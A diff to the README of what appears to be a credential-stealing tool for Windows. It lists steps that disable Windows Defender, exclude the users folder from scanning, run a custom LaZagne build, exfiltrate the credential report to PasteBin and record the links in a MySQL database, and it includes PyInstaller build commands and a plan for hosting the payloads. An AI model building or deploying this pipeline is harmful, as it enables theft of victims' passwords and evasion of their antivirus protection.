@@ -5,20 +5,19 @@ This project automates several open source technologies to dump and exfiltrate s
 * Disable Windows Defender real-time monitoring
 * Add an exception to Windows Defender for the `C:\Users\` folder
 * Download a custom-compiled version of [LaZagne](https://github.com/AlessandroZ/LaZagne)
-* Download and launch the data exfiltration executable 
-* POST credential report to [PasteBin](https://pastebin.com/doc_api)
+* Download and launch the wrapper/exfiltration executable 
+* Save credential report to [PasteBin](https://pastebin.com/doc_api)
 * Save PasteBin report URL to MySQL database
 
-## Install dependencies
+## Build executables
+Executable files generated with PyInstaller are specific to the active operating system, so a Windows 10 VM with Python3 is required for this step.
 ```
 python -m pip install -r requirements.txt
-```
-
-## Build executables
-```
 python -m PyInstaller --onefile lazagne.spec
 python -m PyInstaller --onefile qa.py
 ```
+
+The generated executables will be saved to the `dist\` directory.
 
 ## Deploy infrastructure
 This webapp is responsible for hosting the generated executables and for keeping track of all PasteBin links. While building the executables requires a Windows machine, Linux or macOS is recommended for the webserver host. 
